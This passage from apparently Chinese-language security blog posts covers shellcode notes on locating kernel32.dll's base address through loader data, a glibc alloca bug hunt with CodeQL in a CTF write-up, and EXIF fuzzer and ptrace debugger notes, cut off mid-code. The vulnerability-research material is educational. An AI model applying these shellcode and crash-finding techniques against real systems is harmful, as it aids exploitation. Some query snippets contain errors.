class="comment">// ESI = 第一个_LDR_DATA_TABLE_ENTRY</span></span><br><span class="line"></span><br><span class="line">MOV ESI, [ESI] <span class="comment">// ESI = 第二个_LDR_DATA_TABLE_ENTRY</span></span><br><span class="line"></span><br><span class="line">MOV ESI, [ESI] <span class="comment">// ESI = 第三个_LDR_DATA_TABLE_ENTRY</span></span><br><span class="line"></span><br><span class="line">MOV EBX, [ESI+<span class="number">10</span>] <span class="comment">// EBX = kernel32.dll基地址</span></span><br></pre></td></tr></table></figure><p>有了<code>kernel32.dll</code>的基地址，我们就可以根据<code>PE</code>文件的结构找到<code>GetProcAddress</code>的地址，然后可以随意得到需要的函数地址，为之后的shellcode编写提供了便利，这种通用性代码的发明使得shellcode能够在不同的系统版本上稳定的工作。</p><p><strong>对于lodsb指令：</strong></p><p>LODS 从串取指令</p><p>LODS SRC</p><p>LODSB &#x2F;&#x2F;从字节串取 AL&#x3D;(SI)</p><p>LODSW &#x2F;&#x2F;从字串取 AX&#x3D; (SI±1) (SI)</p><p>执行操作：把由SI指定的数据段中字节或字单元的内容送入AL或AX中,并根据DF值及数据类型修改SI的内容.</p><p>1.在执行该指令之前,要取的数据必须在存储器中预先定义(用DB或DW),必须预置SI的初值.</p><p>2.源串允许使用段超越前缀来改变数据存储的段区.</p><p>正确格式应该是lodsb&#x2F;lodsw&#x2F;lodsd（d后缀在32位汇编中使用）。</p><p>源操作数是默认为SI&#x2F;ESI。且不能使用别的寄存器。</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>GitHub Security Lab CTF 1: SEGV hunt</title>
      <link href="/2022/08/09/GitHub-Security-Lab-CTF-1-SEGV-hunt/"/>
      <url>/2022/08/09/GitHub-Security-Lab-CTF-1-SEGV-hunt/</url>
      
        <content type="html"><![CDATA[<h1 id="GitHub-Security-Lab-CTF-1-SEGV-hunt"><a href="#GitHub-Security-Lab-CTF-1-SEGV-hunt" class="headerlink" title="GitHub Security Lab CTF 1: SEGV hunt"></a>GitHub Security Lab CTF 1: SEGV hunt</h1><p><a href="https://securitylab.github.com/ctf/segv/">https://securitylab.github.com/ctf/segv/</a></p><p>挖GNU C lib（glibc）中的alloca洞，用来给栈分配缓冲区的。不安全的点在于：没有检查是否有足够的栈空间留给缓冲区，如果所需缓冲区太大导致alloca返回一个不可用指针，可能会在读写buffer的时候导致SIGSEGV。所以alloca一般用于分配小buffer。glibc调用了几百次alloca，你要用CodeQL找到没有检查buffer大小的洞</p><ul><li>找到alloc的宏。它是一个__builtin_alloca扩展的内置函数</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">import cpp</span><br><span class="line">from FunctionCall fc #all calls in program</span><br><span class="line">where fc.getTarget().getName() = &quot;__builtin_alloca&quot;</span><br><span class="line">#getTarget可以获取所有被调用者</span><br><span class="line">select fc</span><br></pre></td></tr></table></figure><ul><li>过滤小buffer</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">import semmle.code.cpp.rangeanalysis.SimpleRangeAnalysis</span><br><span class="line">import cpp</span><br><span class="line">from Function fc</span><br><span class="line">where fc.getTarget().hasQualifiedName(&quot;__builtin_alloca&quot;) and (</span><br><span class="line">upperBound(fc.getArgument(0).getFullyConverted()) &gt;= 65536 or</span><br><span class="line"> lowerBound(fc.getArgument(0).getFullyConverted()) &lt; 0</span><br><span class="line">)</span><br><span class="line">#找出特定表达式可以具有的最大和最小范围,发现越界漏洞或整数溢出漏洞时很有用</span><br><span class="line">select fc,fc.getFile().toString() + &quot;:L&quot; + fc.getLocation().getStartLine()</span><br></pre></td></tr></table></figure><ul><li>过滤被<code>__libc_use_alloca</code> ********保护的alloc调用</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">import cpp</span><br><span class="line">import semmle.code.cpp.controlflow.Guards</span><br><span class="line">from FunctionCall fc, GuardCondition gc, FunctionCall fc2</span><br><span class="line"></span><br><span class="line">string getPostfix(Expr f)&#123;</span><br><span class="line">result = f.getFile().toString() + &quot;:L&quot; +f.getLocation().getStartLine().getStratLine()</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">where fc2.getTarget().hasQualifiedName(&quot;__libc_use_alloca&quot;)</span><br><span class="line">and fc.getTarget().hasQualifiedName(&quot;__builtin_alloca&quot;)</span><br><span class="line">#检测在__alloca进入Basic Block的条件下__libc_use_alloca函数被调用的次数</span><br><span class="line">and gc.controls(fc.getBasicBlock(), _) #返回 条件语句控制指定基本块 的条件语句</span><br><span class="line">and gc.getAChild*() = fc2 #保证要找的保护条件是基于__libc_use_alloca</span><br><span class="line"># *是自反传递闭包，应用这个谓词零次或多次（包括它自己）</span><br><span class="line">select gc,getPostfix(gc)</span><br></pre></td></tr></table></figure><ul><li>有时将结果<code>__libc_use_alloca</code>赋值给一个变量，然后将其用作保护条件。用<code>local dataflow</code>找到此保护条件。</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">import semmle.code.cpp.controlflow.Guards</span><br><span class="line">import semmle.code.cpp.dataflow.DataFlow</span><br><span class="line"></span><br><span class="line">string getPostfix(Expr f)&#123;</span><br><span class="line">result = f.getFile().toString() + &quot;:L&quot; +f.getLocation().getStartLine().getStratLine()</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">from FunctionCall fc, FunctionCall fc2, GuardCondition gc,</span><br><span class="line">DataFlow::Node source, DataFlow::Node sink</span><br><span class="line">where fc.getTarget().getName() = &quot;__builtin_alloca&quot;</span><br><span class="line">    and fc2.getTarget().getName() = &quot;__libc_use_alloca&quot;</span><br><span class="line">    and gc.controls(fc.getBasicBlock(), _)</span><br><span class="line">    and DataFlow::localFlow(source , sink)</span><br><span class="line">    and source.asExpr() = fc2 #污染源</span><br><span class="line">    and sink.asExpr() = gc #敏感点</span><br><span class="line">select gc,getPostfix(fc2)</span><br></pre></td></tr></table></figure><ul><li>有时<code>__libc_use_alloca</code>会被封装送到到<code>__builtin_expect</code>的调用里，过滤闭包找到它</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">import semmle.code.cpp.controlflow.Guards</span><br><span class="line">import semmle.code.cpp.dataflow.DataFlow</span><br><span class="line"></span><br><span class="line">string getPostfix(Expr f)&#123;</span><br><span class="line">result = f.getFile().toString() + &quot;:L&quot; +f.getLocation().getStartLine().getStratLine()</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">from FunctionCall fc, FunctionCall fc2, GuardCondition gc,</span><br><span class="line">DataFlow::Node source, DataFlow::Node sink</span><br><span class="line">where fc.getTarget().getName() = &quot;__builtin_alloca&quot;</span><br><span class="line">    and fc2.getTarget().getName() = &quot;__libc_use_alloca&quot;</span><br><span class="line">    and gc.controls(fc.getBasicBlock(), _)</span><br><span class="line">    and DataFlow::localFlow(source , sink)</span><br><span class="line">    and source.asExpr() = fc2</span><br><span class="line">    and sink.asExpr() = gc.getAChild*() </span><br><span class="line">    # * is Reflexive transitive closure, apply this predicate zero or more times.</span><br><span class="line">    #   gc.getAChild*() means gc and gc&#x27;s all chlidren</span><br><span class="line">    # __builtin_expect(__libc_use_alloca()), __libc_use_alloca is __builtin_expect&#x27;s child.</span><br><span class="line">select gc,getPostfix(gc)</span><br></pre></td></tr></table></figure><ul><li>过滤掉！取反的情况，利用<a href="https://codeql.github.com/codeql-standard-libraries/cpp/semmle/code/cpp/controlflow/ControlFlowGraph.qll/type.ControlFlowGraph$ControlFlowNode.html">ControlFlowNode</a></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">import semmle.code.cpp.controlflow.Guards</span><br><span class="line">import semmle.code.cpp.dataflow.DataFlow</span><br><span class="line"></span><br><span class="line">string getPostfix(Expr f)&#123;</span><br><span class="line">result = f.getFile().toString() + &quot;:L&quot; +f.getLocation().getStartLine().getStratLine()</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">from FunctionCall fc, FunctionCall fc2, GuardCondition gc,</span><br><span class="line">GuardCondition guard,BasicBlock block1,BasicBlock block2,</span><br><span class="line">DataFlow::Node source, DataFlow::Node sink</span><br><span class="line"></span><br><span class="line">where fc.getTarget().getName() = &quot;__builtin_alloca&quot;</span><br><span class="line">    and fc2.getTarget().getName() = &quot;__libc_use_alloca&quot;</span><br><span class="line">and block1.contains(fc)</span><br><span class="line">and guard.controls(block1, _) #包含__builtin_alloca的条件语句</span><br><span class="line">and DataFlow::localFlow(source,sink)</span><br><span class="line">and block2.contains(fc2) </span><br><span class="line">and source.asExpr() = block2.getANode() #扩大__libc_use_alloca上下游基础块的查找</span><br><span class="line">and sink.asExpr() = guard.getAChild*()</span><br><span class="line">select guard,getPostfix(guard)</span><br></pre></td></tr></table></figure><ul><li>找到受<code>__libc_use_alloca</code>保护的安全的<code>alloca</code>调用，加上OOB</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">import semmle.code.cpp.controlflow.Guards</span><br><span class="line">import semmle.code.cpp.dataflow.DataFlow</span><br><span class="line"></span><br><span class="line">string getPostfix(Expr f)&#123;</span><br><span class="line">result = f.getFile().toString() + &quot;:L&quot; +f.getLocation().getStartLine().getStratLine()</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">predicate isSafeAllocaCall(FunctionCall fc) &#123;</span><br><span class="line">     exists( FunctionCall fc2, GuardCondition gc,</span><br><span class="line"> DataFlow::Node source, DataFlow::Node sink</span><br><span class="line">       |   fc2.getTarget().getName() = &quot;__libc_use_alloca&quot;</span><br><span class="line">            and gc.controls(fc.getBasicBlock(), _)</span><br><span class="line">            and DataFlow::localFlow(source , sink)</span><br><span class="line">            and source.asExpr() = fc2.getBasicBlock().getANode()</span><br><span class="line">            and sink.asExpr() = gc.getAChild*() </span><br><span class="line">        )   </span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line">from FunctionCall fc</span><br><span class="line">Where fc.getTarget().hasQualifiedName(&quot;__builtin_alloca&quot;)</span><br><span class="line">and isSafeAllocaCall(fc)</span><br><span class="line">and upperBound(fc.getArgument(0).getFullyConverted()) &lt;65535</span><br><span class="line">and lowerBound(fc.getArgument(0).getFullyConverted()) &gt; 0</span><br><span class="line">select fc,&quot;is safe calls __alloca()&quot;,getPostfix(fc)</span><br></pre></td></tr></table></figure><ul><li>污点跟踪找到不安全的alloca调用，其分配大小被变量所控制且这个变量从file里读取。首先找到fopen。source是fopen的调用，sink是危险调用alloca的参数大小，寻找二者可达路径。</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">import cpp</span><br><span class="line">import semmle.code.cpp.rangeanalysis.SimpleRangeAnalysis</span><br><span class="line">import semmle.code.cpp.dataflow.TaintTracking</span><br><span class="line">import semmle.code.cpp.models.interfaces.DataFlow</span><br><span class="line">import semmle.code.cpp.controlflow.Guards</span><br><span class="line">import DataFlow::PathGraph</span><br><span class="line"></span><br><span class="line"># Track taint through `__strnlen`.</span><br><span class="line">class StrlenFunction extends DataFlowFunction &#123;</span><br><span class="line">  StrlenFunction() &#123; this.getName().matches(&quot;%str%len%&quot;) &#125;</span><br><span class="line"></span><br><span class="line">  override predicate hasDataFlow(FunctionInput i, FunctionOutput o) &#123;</span><br><span class="line">    i.isParameter(0) and o.isReturnValue()</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"># Track taint through `__getdelim`.</span><br><span class="line">class GetDelimFunction extends DataFlowFunction &#123;</span><br><span class="line">  GetDelimFunction() &#123; this.getName().matches(&quot;%get%delim%&quot;) &#125;</span><br><span class="line"></span><br><span class="line">  override predicate hasDataFlow(FunctionInput i, FunctionOutput o) &#123;</span><br><span class="line">    i.isParameter(3) and o.isParameterDeref(0)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class Config extends TaintTracking::Configuration &#123;</span><br><span class="line">  Config() &#123; this = &quot;fopen_to_alloca_taint&quot; &#125;</span><br><span class="line"></span><br><span class="line">  override predicate isSource(DataFlow::Node source) &#123;</span><br><span class="line">    exists(FunctionCall fc | </span><br><span class="line">        fc.getTarget().getName() = &quot;_IO_new_fopen&quot;</span><br><span class="line">        and source.asExpr() = fc</span><br><span class="line">        )</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  override predicate isSink(DataFlow::Node sink) &#123;</span><br><span class="line">    exists(Expr sizeExpr, FunctionCall alloca|</span><br><span class="line">        alloca.getTarget().getName() = &quot;__builtin_alloca&quot;</span><br><span class="line">        and not isSafeAllocaCall(alloca)</span><br><span class="line">        and (upperBound(alloca.getArgument(0).getFullyConverted()) &gt;= 65535 or upperBound(alloca.getArgument(0).getFullyConverted()) &lt; 0)</span><br><span class="line">        and sizeExpr = alloca.getArgument(0).getFullyConverted()</span><br><span class="line">        and sink.asExpr() = sizeExpr #sink是危险点</span><br><span class="line">        )</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">from Config cfg, DataFlow::PathNode source, DataFlow::PathNode sink</span><br><span class="line">where cfg.hasFlowPath(source, sink)</span><br><span class="line">select sink, source, sink, &quot;fopen flows to alloca&quot;</span><br></pre></td></tr></table></figure><ul><li>分析crashes，调试下输入，利用poc</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">fopen flows to allocagconv_conf.c:323:25</span><br><span class="line">Path</span><br><span class="line">1call to _IO_new_fopen gconv_conf.c:369:14</span><br><span class="line">2rp gconv_conf.c:418:14</span><br><span class="line">3rp gconv_conf.c:250:19</span><br><span class="line">4... + ... gconv_conf.c:323:25</span><br></pre></td></tr></table></figure><p>源头是 read_conf_file 里从 filename 打开的 fp 文件句柄，</p><p>解析文件字节流时使用的 (char * )rp 在解析conf文件中的module块时会进入 add_module 并把rp作为实参</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Read the next configuration file.  */</span></span><br><span class="line"><span class="type">static</span> <span class="type">void</span></span><br><span class="line"><span class="title function_">read_conf_file</span> <span class="params">(<span class="type">const</span> <span class="type">char</span> *filename, <span class="type">const</span> <span class="type">char</span> *directory, <span class="type">size_t</span> dir_len,</span></span><br><span class="line"><span class="params"><span class="type">void</span> **modules, <span class="type">size_t</span> *nmodules)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">/* Note the file is opened with cancellation in the I/O functions</span></span><br><span class="line"><span class="comment">     disabled.  */</span></span><br><span class="line">  FILE *fp = fopen (filename, <span class="string">&quot;rce&quot;</span>);</span><br><span class="line">  ...</span><br><span class="line">      <span class="keyword">if</span> (rp - word == <span class="keyword">sizeof</span> (<span class="string">&quot;alias&quot;</span>) - <span class="number">1</span></span><br><span class="line">  &amp;&amp; <span class="built_in">memcmp</span> (word, <span class="string">&quot;alias&quot;</span>, <span class="keyword">sizeof</span> (<span class="string">&quot;alias&quot;</span>) - <span class="number">1</span>) == <span class="number">0</span>)</span><br><span class="line">add_alias (rp, *modules);</span><br><span class="line">      <span class="keyword">else</span> <span class="keyword">if</span> (rp - word == <span class="keyword">sizeof</span> (<span class="string">&quot;module&quot;</span>) - <span class="number">1</span></span><br><span class="line">       &amp;&amp; <span class="built_in">memcmp</span> (word, <span class="string">&quot;module&quot;</span>, <span class="keyword">sizeof</span> (<span class="string">&quot;module&quot;</span>) - <span class="number">1</span>) == <span class="number">0</span>)</span><br><span class="line">add_module (rp, directory, dir_len, modules, nmodules, modcounter++);</span><br><span class="line">      <span class="comment">/* else */</span></span><br><span class="line"><span class="comment">/* Otherwise ignore the line.  */</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">free</span> (line);</span><br><span class="line"></span><br><span class="line">  fclose (fp);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在add_module里rp形参被赋给了from</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Add new module.  */</span></span><br><span class="line"><span class="type">static</span> <span class="type">void</span></span><br><span class="line"><span class="title function_">add_module</span> <span class="params">(<span class="type">char</span> *rp, <span class="type">const</span> <span class="type">char</span> *directory, <span class="type">size_t</span> dir_len, <span class="type">void</span> **modules,</span></span><br><span class="line"><span class="params">    <span class="type">size_t</span> *nmodules, <span class="type">int</span> modcounter)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">/* We expect now</span></span><br><span class="line"><span class="comment">     1. `from&#x27; name</span></span><br><span class="line"><span class="comment">     2. `to&#x27; name</span></span><br><span class="line"><span class="comment">     3. filename of the module</span></span><br><span class="line"><span class="comment">     4. an optional cost value</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">gconv_alias</span> <span class="title">fake_alias</span>;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">gconv_module</span> *<span class="title">new_module</span>;</span></span><br><span class="line">  <span class="type">char</span> *from, *to, *module, *wp;</span><br><span class="line">  <span class="type">int</span> need_ext;</span><br><span class="line">  <span class="type">int</span> cost_hi;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">while</span> (__isspace_l (*rp, _nl_C_locobj_ptr))</span><br><span class="line">    ++rp;</span><br><span class="line">  from = rp;</span><br><span class="line">    ...</span><br><span class="line">    <span class="comment">/* See whether we have already an alias with this name defined.  */</span></span><br><span class="line">  fake_alias.fromname = strndupa (from, to - from);</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>to - from作为strndupa的size实参</p><p>而strndupa是使用了alloca实现的strndup，存在_libc_use_alloca保证安全的alloca调用，因此在to-from也就是，即conf 中 module name 极端长的情况下会程序会crash (SIGSEV)</p><p>其实基本没利用价值</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>A simple fuzzer</title>
      <link href="/2022/07/09/A-simple-fuzzer/"/>
      <url>/2022/07/09/A-simple-fuzzer/</url>
      
        <content type="html"><![CDATA[<p>EXIF Fuzzer</p><p><a href="https://www.anquanke.com/post/id/202982">https://www.anquanke.com/post/id/202982</a></p><p>1.编写解析exif</p><p>2.编写变异策略</p><p>3.寻找解析exif程序并编译使用 用Asan内存检测器观测内存信息</p><p>4.编写监控STUOUT STUERR段错误</p><p>5.编写crashes创建和保存变异模型</p><p>6.编译<code>exifsan</code>对每个引发崩溃的图像进行解析，记录崩溃地址，同时查看崩溃发生时是否存在读或写操作</p><p><a href="https://www.anquanke.com/post/id/202989">https://www.anquanke.com/post/id/202989</a></p><p>7.性能优化：减少类型转换逻辑</p><p>8.改c++</p><p>9.对新的目标进行测试</p><p><a href="https://www.anquanke.com/post/id/207307#h2-4">https://www.anquanke.com/post/id/207307#h2-4</a></p><p>10.覆盖率的重要性&#x2F;数学知识</p><img src="/2022/07/09/A-simple-fuzzer/Untitled.png" class title="Untitled"><p><a href="https://www.anquanke.com/post/id/234437#h2-3">https://www.anquanke.com/post/id/234437#h2-3</a></p><ul><li><p>拥有快照&#x2F;代码覆盖率指引的Fuzzer</p><ol><li>启动目标二进制文件，但在任何东西运行之前，在第一条指令时中断</li><li>设置”开始“和”结束”位置上的断点（“开始”的位置是从磁盘上读取完毕文件后，“结束”的位置将是执行<code>exit()</code>后）</li><li>运行程序，直到达到“开始”断点</li><li>将进程的所有可写内存段收集到一个缓冲区中</li><li>捕获所有寄存器状态</li><li>将我们的模糊测试样例插入到内存堆中，覆盖程序从磁盘中读取的文件</li><li>恢复执行目标二进制文件，直到达到“结束”断点</li><li>将程序状态倒退到“开始”的位置</li><li>从第6步开始重复</li></ol></li><li><p>11.用Ptrace编写一个简单的调试器</p>  <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">pid_t</span> child_pid = fork();<span class="comment">//生成第二个进程</span></span><br><span class="line"><span class="keyword">if</span>(child_pid == <span class="number">0</span>)&#123;</span><br><span class="line">execute_debuggee(debugee)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">long</span> ptrace_result = ptrace(PTRACE_TRACEME,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>);<span class="comment">//让父进程跟踪子进程</span></span><br><span class="line"><span class="keyword">if</span>(prtace_result == <span class="number">-1</span>)&#123;</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>,<span class="string">&quot;\033[1;35mdragonfly&gt;\033[0m error (%d) during &quot;</span> ,errno);</span><br><span class="line">perror(<span class="string">&quot;ptrace&quot;</span>);</span><br><span class="line"><span class="built_in">exit</span>(errno);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> personality_result = personality(ADDR_NO_RANDOMIZE);</span><br><span class="line"><span class="comment">//因为确定一个断点地址，它是一个静态的值，我们无法在每个进程中都动态的更改这个值</span></span><br><span class="line"><span class="comment">//关闭ASLR使得每一个进程中的内存布局一致</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (personality_result == <span class="number">-1</span>) &#123;</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;\033[1;35mdragonfly&gt;\033[0m error (%d) during &quot;</span>, errno);</span><br><span class="line">    perror(<span class="string">&quot;personality&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(errno);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//把stdout和stderr重定向流到/dev/null，以免混淆目标二进制文件的输出</span></span><br><span class="line"><span class="type">int</span> fd = open(<span class="string">&quot;/dev/null&quot;</span>, O_WRONLY);</span><br><span class="line">dup2(fd, <span class="number">1</span>);</span><br><span class="line">dup2(fd, <span class="number">2</span>);</span><br><span class="line">close(fd);</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> execl_result = execl(debugee,debugee,<span class="literal">NULL</span>);</span><br><span class="line"><span class="keyword">if</span>(execl_result == <span class="number">-1</span>)&#123;</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;\033[1;35mdragonfly&gt;\033[0m error (%d) during &quot;</span>, errno);</span><br><span class="line">    perror(<span class="string">&quot;execl&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(errno);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//在插入断点之前获取地址上的一个字节的值</span></span><br><span class="line"><span class="type">long</span> <span class="type">long</span> <span class="type">unsigned</span> <span class="title function_">get_value</span><span class="params">(<span class="type">pid_t</span> child_pid , <span class="type">long</span> <span class="type">long</span> <span class="type">unsigned</span> address)</span>&#123;</span><br><span class="line">errno = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">long</span> <span class="type">long</span> <span class="type">unsigned</span> value = ptrace(PTRACE_PEEKTEXT , child_pid ,(<span class="type">void</span>*)address , <span class="number">0</span>);</span><br><span class="line"><span class="comment">//使用PTRACE_PEEKTEXT参数来读取位于子进程（child_pid）中的地址的值，该子进程是我们的目标进程</span></span><br><span class="line"><span 